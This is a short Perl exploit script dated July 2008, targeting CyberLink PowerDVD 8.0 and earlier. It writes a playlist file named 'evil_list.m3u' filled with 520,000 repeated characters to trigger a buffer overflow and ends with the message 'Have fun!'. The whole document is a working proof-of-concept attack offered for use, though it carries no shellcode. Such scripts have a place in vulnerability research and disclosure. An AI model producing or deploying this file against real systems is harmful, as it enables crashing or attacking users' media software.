#!/usr/bin/perl
#
# CyberLink PowerDVD <= 8.0 Crafted PLS/M3U Playlist File Buffer Overflow Exploit
# Coded by Gjoko "LiquidWorm" Krstic
# liquidworm [At] gmail.com
# http://www.zeroscience.org
#

$buffer = "J" x 520000;

open(m3u, ">./evil_list.m3u"); # or .pls

print m3u "$buffer";

print "\n--> Evil Playlist created... Have fun!\n";

# July, 2008
